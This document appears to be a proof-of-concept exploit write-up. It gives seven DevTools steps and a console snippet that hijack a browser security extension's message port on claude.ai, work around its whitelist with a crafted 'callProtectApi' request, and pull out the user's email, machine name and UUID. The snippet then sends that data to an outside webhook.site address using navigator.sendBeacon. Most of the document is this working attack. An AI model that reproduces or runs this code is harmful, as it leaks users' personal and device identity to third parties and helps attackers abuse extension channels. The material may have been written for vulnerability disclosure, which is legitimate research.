METHOD 1 — Content Script Breakpoint WORKS — 7 STEPS

⚠️ Why iframe failed: claude.ai returns X-Frame-Options: DENY — the iframe loads a Chrome error page, content script never injects, port never fires.

✅ Fix: Set a breakpoint directly inside the extension's content script right before ps_rpc_port fires. This gives us a window to register our listener.
  1. Open a new tab → navigate to https://claude.ai with DevTools open (F12)
  2. In DevTools → Sources tab → press Ctrl+Shift+F to open global search
  3. Search for ps_rpc_port → click the result to open content.bundle.js
  4. Find the line containing window.postMessage({ps_rpc_port → click the line number to set a blue breakpoint dot
  5. Press Ctrl+R to reload — DevTools will pause on that exact line
  6. Switch to Console tab → paste the snippet below → press Enter (this registers the listener while paused)
  7. Press F8 (Resume) → port fires → listener captures it → check Console + webhook.site
/* PASTE IN CONSOLE WHILE PAUSED AT THE BREAKPOINT */
window.addEventListener("message", function H(e) {
  if (!e.data || e.data.ps_rpc_port !== true || !e.ports || !e.ports[0]) return;
  window.removeEventListener("message", H);
  var port = e.ports[0], token = e.data.token, id = crypto.randomUUID();
  port.start();
  console.log("%c[PS-STEAL] Port captured!", "color:lime;font-weight:bold");
  port.onmessage = function(r) {
    if (r.data.messageId !== id) return;
    var ui = r.data.response && r.data.response.userInfo;
    console.log("%c[PS-STEAL] EMAIL: " + (ui&&ui.email), "color:lime;font-size:16px;font-weight:bold");
    console.log("[PS-STEAL] MACHINE: " + (ui&&ui.machineName) + " | UUID: " + (ui&&ui.userUUID));
    navigator.sendBeacon("https://webhook.site/af9993fc-5721-40b1-818c-b73a3d61a039",
      JSON.stringify({
        phase:2, method:"content_script_breakpoint", origin:location.origin,
        email: ui&&ui.email, profileEmail: ui&&ui.profileEmail,
        machineName: ui&&ui.machineName, userUUID: ui&&ui.userUUID,
        identitySource: ui&&ui.identitySource,
        domainActions: r.data.response&&r.data.response.domainActions
      }));
  };
  /* BYPASS A: whitelist checks e.message="callProtectApi" ✓
     background routes on type="getSiteActionConfig" → returns email */
  port.postMessage({token:token, messageId:id, message:{
    message:"callProtectApi", type:"getSiteActionConfig",
    domain:location.hostname, ctx:{flowTraceId:crypto.randomUUID()}
  }});
});
console.log("[PS-STEAL] Listener ready — press F8 now");
